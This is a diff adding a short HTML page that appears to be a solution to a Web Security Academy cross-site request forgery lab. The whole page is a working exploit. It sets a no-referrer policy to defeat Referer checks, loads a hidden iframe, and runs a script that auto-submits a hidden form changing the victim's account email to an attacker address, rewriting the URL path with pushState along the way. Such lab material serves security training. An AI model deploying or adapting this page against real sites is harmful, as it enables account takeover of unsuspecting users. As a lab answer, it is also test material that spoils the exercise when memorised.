@@ -1,0 +1,15 @@
+<html>
+  <head>
+    <meta name="referrer" content="no-referrer">
+  </head>
+  <body>
+    <iframe style="display:none" name="csrf-iframe"></iframe>
+    <form action="https://xxxxxxxxxxxxxxURLxxxxxxxxxxxxxxx.web-security-academy.net/my-account/change-email" method="POST" target="csrf-iframe">
+      <input type="hidden" name="email" value="test@attacker.com" />
+    </form>
+    <script>
+      history.pushState('', '', '/');
+      document.forms[0].submit();
+    </script>
+  </body>
+</html>
